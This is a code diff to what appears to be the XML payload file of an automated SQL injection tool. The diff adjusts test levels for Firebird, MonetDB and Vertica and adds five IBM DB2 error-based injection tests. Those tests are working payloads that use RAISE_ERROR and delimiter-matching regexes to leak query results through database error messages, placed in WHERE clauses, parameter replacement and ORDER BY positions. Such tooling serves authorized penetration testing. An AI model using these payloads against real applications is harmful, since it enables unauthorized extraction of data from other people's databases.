@@ -683,7 +683,7 @@
     <test>
         <title>Firebird OR error-based - WHERE or HAVING clause</title>
         <stype>2</stype>
-        <level>3</level>
+        <level>4</level>
         <risk>3</risk>
         <clause>1,9</clause>
         <where>2</where>
@@ -721,7 +721,7 @@
     <test>
         <title>MonetDB OR error-based - WHERE or HAVING clause</title>
         <stype>2</stype>
-        <level>3</level>
+        <level>4</level>
         <risk>3</risk>
         <clause>1,9</clause>
         <where>2</where>
@@ -759,7 +759,7 @@
     <test>
         <title>Vertica OR error-based - WHERE or HAVING clause</title>
         <stype>2</stype>
-        <level>3</level>
+        <level>4</level>
         <risk>3</risk>
         <clause>1,8,9</clause>
         <where>2</where>
@@ -774,6 +774,45 @@
             <dbms>Vertica</dbms>
         </details>
     </test>
+
+    <test>
+        <title>IBM DB2 AND error-based - WHERE or HAVING clause</title>
+        <stype>2</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,8,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=RAISE_ERROR('70001','[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>AND [RANDNUM]=RAISE_ERROR('70001','[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM SYSIBM.SYSDUMMY1)||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>IBM DB2</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>IBM DB2 OR error-based - WHERE or HAVING clause</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,8,9</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=RAISE_ERROR('70001','[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>OR [RANDNUM]=RAISE_ERROR('70001','[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM SYSIBM.SYSDUMMY1)||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>IBM DB2</dbms>
+        </details>
+    </test>
+
     <!--
          TODO: if possible, add payload for SQLite, Microsoft Access,
          and SAP MaxDB - no known techniques at this time
@@ -1054,6 +1093,25 @@
             <dbms>Firebird</dbms>
         </details>
     </test>
+
+    <test>
+        <title>IBM DB2 error-based - Parameter replace</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,3</clause>
+        <where>3</where>
+        <vector>RAISE_ERROR('70001','[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>RAISE_ERROR('70001','[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM SYSIBM.SYSDUMMY1)||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>IBM DB2</dbms>
+        </details>
+    </test>
     <!-- End of error-based tests - Parameter replace -->
 
     <!-- Error-based tests - ORDER BY, GROUP BY clause -->
@@ -1197,7 +1255,6 @@
         </details>
     </test>
 
-
     <test>
         <title>PostgreSQL error-based - ORDER BY, GROUP BY clause</title>
         <stype>2</stype>
@@ -1280,7 +1337,7 @@
         <stype>2</stype>
         <level>5</level>
         <risk>1</risk>
-        <clause>2,3</clause>
+        <clause>3</clause>
         <where>1</where>
         <vector>,(SELECT [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]'))</vector>
         <request>
@@ -1291,6 +1348,25 @@
         </response>
         <details>
             <dbms>Firebird</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>IBM DB2 error-based - ORDER BY clause</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>3</clause>
+        <where>1</where>
+        <vector>,RAISE_ERROR('70001','[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>,RAISE_ERROR('70001','[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM SYSIBM.SYSDUMMY1)||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>IBM DB2</dbms>
         </details>
     </test>
     <!--
